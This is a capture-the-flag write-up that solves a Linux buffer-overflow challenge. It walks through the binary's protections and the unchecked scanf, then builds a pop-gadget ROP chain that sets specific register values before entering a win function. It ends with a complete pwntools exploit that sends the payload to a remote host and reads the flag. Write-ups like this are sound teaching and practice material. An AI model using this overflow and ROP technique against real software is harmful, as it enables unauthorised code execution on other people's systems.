# Coding Agent
This challenge involves a 64-bit Linux binary with a classic **Buffer Overflow** vulnerability, complicated by a **Conditional Win** function that checks specific register values.

---

### 1. Challenge Analysis

### Binary Protections

Using `checksec`, we identified the following:

- **NX (No-Execute):** Enabled (cannot execute shellcode on the stack).
- **PIE (Position Independent Executable):** **Disabled**. Addresses like `0x4013f8` are static.
- **Stack Canary:** **Disabled**. We can overwrite the return address without restriction.
- **SHSTK/IBT:** Enabled. This means we should jump to the start of functions (specifically at `endbr64` instructions) to avoid hardware-level crashes.

### Vulnerability

In `main`, the program uses `scanf("%s", &buf)`. Because `%s` does not check the length of the input, and the buffer is only 32 bytes (`0x20`) from the base pointer, we can overflow the stack.

---

### 2. The "Win" Condition

The function `win` at `0x4013f8` is designed to print the flag, but it contains a gatekeeper check.

**Disassembly Snippet:**

Code snippet

`0x0000000000401407 <+15>:    mov    %r14,-0x128(%rbp)
0x000000000040140e <+22>:    mov    %rbx,-0x130(%rbp)
0x0000000000401415 <+29>:    mov    %r12,-0x138(%rbp)
...
0x0000000000401426 <+46>:    cmp    %rax,-0x128(%rbp) ; Checks r14
0x000000000040142d <+53>:    jne    0x401455          ; Jump to "wrong!" if fail`

To get the flag, we must ensure that when we enter `win`, the following registers hold these specific values:

- **`r14`**: `0x7a0000006876`
- **`rbx`**: `0x3b001d000084000`
- **`r12`**: `0x700002c40`

---

### 3. Finding the Gadgets

Since we cannot control registers directly via the overflow, we use **Return-Oriented Programming (ROP)**. We found a "gadget farm" in `some_function` at `0x4013ed` that pops multiple registers from the stack before returning.

**Gadget Sequence (`0x4013ed`):**

1. `pop rbx`
2. `pop rbp`
3. `pop r12`
4. `pop r13`
5. `pop r14`
6. `pop r15`
7. `ret`

---

### 4. Full Solution Annotated

Python

    from pwn import *
    
    # Target environment
    host = '133.88.122.244'
    port = 31333
    
    # --- STEP 1: Define required register values ---
    val_rbx = 0x3b001d000084000
    val_r12 = 0x700002c40
    val_r14 = 0x7a0000006876
    
    # --- STEP 2: Define Addresses ---
    # The ROP gadget that lets us set the registers above
    gadget_start = 0x4013ed 
    # The target win function
    win_addr = 0x4013f8
    # A simple 'ret' instruction used to align the stack to 16-bytes
    # (Crucial for Ubuntu 24.04 glibc calls like printf/open)
    ret_alignment = 0x4015f4 
    
    # --- STEP 3: Construct the Payload ---
    # 32 bytes (buffer size) + 8 bytes (saved RBP) = 40 bytes padding
    payload = b"A" * 40          
    
    # Overwrite the Return Address of main with our gadget
    payload += p64(gadget_start) 
    
    # Provide the data for the 'pop' instructions in the gadget
    payload += p64(val_rbx)      # lands in rbx
    payload += p64(0x404800)     # lands in rbp (pointing to writable memory)
    payload += p64(val_r12)      # lands in r12
    payload += p64(0)            # lands in r13 (not used, filler)
    payload += p64(val_r14)      # lands in r14
    payload += p64(0)            # lands in r15 (not used, filler)
    
    # Stack Alignment fix (Extra ret)
    payload += p64(ret_alignment)
    
    # The final address the ROP chain jumps to after setting registers
    payload += p64(win_addr)     
    
    # --- STEP 4: Execution ---
    io = remote(host, port)
    io.recvuntil(b"today?\n")    # Wait for the prompt
    io.sendline(payload)         # Send the exploit
    io.interactive()             # Keep connection open to read the flag

---

### 5. Why it Worked

1. **The Hijack:** By sending 40 bytes of padding, we reached the Saved Return Address on the stack. Replacing it with our gadget meant that instead of terminating normally, the program jumped to `some_function+381`.
2. **Register Control:** The `pop` instructions in the gadget pulled our hardcoded hex values off the stack and placed them directly into the CPU registers (`rbx`, `r12`, `r14`).
3. **Bypassing Checks:** When the ROP chain finally jumped into `win`, the comparison instructions (`cmp`) found the exact values they were looking for.
4. **The Flag:** The function proceeded to use those register values to derive the filename string (`flag.txt`), opened the file, and printed the content to our terminal.
